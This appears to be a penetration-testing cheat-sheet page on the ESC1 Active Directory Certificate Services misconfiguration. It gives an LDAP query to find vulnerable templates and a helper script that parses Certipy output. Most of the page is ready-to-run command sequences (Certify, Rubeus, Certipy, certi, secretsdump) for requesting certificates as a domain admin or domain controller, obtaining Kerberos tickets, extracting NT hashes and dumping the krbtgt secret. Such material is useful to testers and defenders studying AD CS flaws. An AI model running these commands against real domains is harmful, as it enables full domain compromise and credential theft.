---
description: Modifiable SAN + Smart Card Logon or Client Authentication or PKINIT Client Authentication EKUs
---

# ESC1

- [https://elkement.wordpress.com/2020/06/21/impersonating-a-windows-enterprise-admin-with-a-certificate-kerberos-pkinit-from-linux/](https://elkement.wordpress.com/2020/06/21/impersonating-a-windows-enterprise-admin-with-a-certificate-kerberos-pkinit-from-linux/)

The vulnerable certificate template allows requesters to specify a SAN in the CSR as well as allows Smart Card Logon (`1.3.6.1.4.1.311.20.2.2`) or Client Authentication (`1.3.6.1.5.5.7.3.2`) or PKINIT Client Authentication (`1.3.6.1.5.2.3.4`) EKUs.




## Enumerate

Find template with this misconfiguration with native Active Directory module:

```powershell
PS > Get-ADObject -LDAPFilter '(&(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2) (pkiextendedkeyusage=1.3.6.1.5.2.3.4))(mspki-certificate-name-flag:1.2.840.113556.1.4.804:=1))' -SearchBase 'CN=Configuration,DC=megacorp,DC=local'
```




## Exploit



### Certify

Request a certificate specifying the `/altname` as a domain admin:

```
Cmd > .\Certify.exe request /ca:CA01.megacorp.local\CorpCA /template:VulnTemplate /altname:DomAdmin
```

Convert `.pem` to a `.pfx` certificate:

```
$ openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

Request a TGT with the `.pfx` certificate:

```
Cmd > .\Rubeus.exe asktgt /domain:megacorp.local /dc:DC01.megacorp.local /user:DomAdmin /certificate:cert.pfx /password:Passw0rdPfx! /ptt
```



### Certipy

Enroll a certificate with privileged subject in SAN:

```
$ certipy req megacorp.local/snovvcrash:'Passw0rd!'@CA01.megacorp.local -ca CorpCA -template VulnTemplate -alt 'administrator@magacorp.local'
```

Request TGT providing certificate and get corresponding NT hash automatically:

```
$ certipy auth -pfx administrator.pfx -domain megacorp.local -username administrator -dc-ip 192.168.1.11
```

Parse `.json` output to find vulnerable templates:

{% code title="esc1.py" %}
```python
import json, csv
import glob

with open(glob.glob('[0-9]*_Certipy.json')[0], 'r', encoding='utf-8-sig') as f:
	templates = json.load(f)['Certificate Templates']

data = []
for templ in templates.values():
	if 'Enrollee Supplies Subject' in templ.keys() and templ['Enrollee Supplies Subject']:
		if templ['Client Authentication'] and 'Enrollment Permissions' in templ['Permissions'].keys() and 'Enrollment Rights' in templ['Permissions']['Enrollment Permissions']:
			for perm in templ['Permissions']['Enrollment Permissions']['Enrollment Rights']:
				groups = []
				for group in ['Domain Users', 'Domain Computers', 'Authenticated Users', 'Everyone']:
					if group in perm:
						groups.append(perm)

			template_name = templ['Template Name']
			try:
				authorities = ','.join(templ['Certificate Authorities'])
			except TypeError:
				authorities = ''

			if groups:
				groups = ','.join(groups)
				data.append([template_name, authorities, groups])
				#print(f'"{template_name}","{authorities}","{groups}"')

header = ['TemplateName', 'CertificateAuthorities', 'DangerousGroups']
with open('esc1.csv', 'w') as f:
	writer = csv.writer(f, quoting=csv.QUOTE_ALL)
	writer.writerow(header)
	for row in data:
		writer.writerow(row)
```
{% endcode %}



### certi

- [https://gist.github.com/Flangvik/15c3007dcd57b742d4ee99502440b250](https://gist.github.com/Flangvik/15c3007dcd57b742d4ee99502440b250)

Enroll a certificate with privileged subject in SAN:

```
$ certi.py req megacorp.local/snovvcrash@CA01.megacorp.local CorpCA -k -n --dc-ip 192.168.1.11 --template VulnTemplate --alt-name 'DC01$'
```

Request TGT providing certificate:

```
$ base64 -w0 DC01.pfx > DC01.pfx.b64
$ python3 gettgtpkinit.py megacorp.local/'DC01$' -pfx-base64 `cat DC01.pfx.b64` -pfx-pass admin -dc-ip 192.168.1.11 DC01.ccache
```

Request NT hash providing TGT or DCSync:

```
$ KRB5CCNAME=DC01.ccache python3 getnthash.py megacorp.local/'DC01$' -dc-ip 192.168.1.11 -key <AS_REP_ENC_KEY>
$ KRB5CCNAME=DC01.ccache secretsdump.py DC02.megacorp.local -dc-ip 192.168.1.11 -just-dc-user 'MEGACORP\krbtgt' -k -no-pass
```
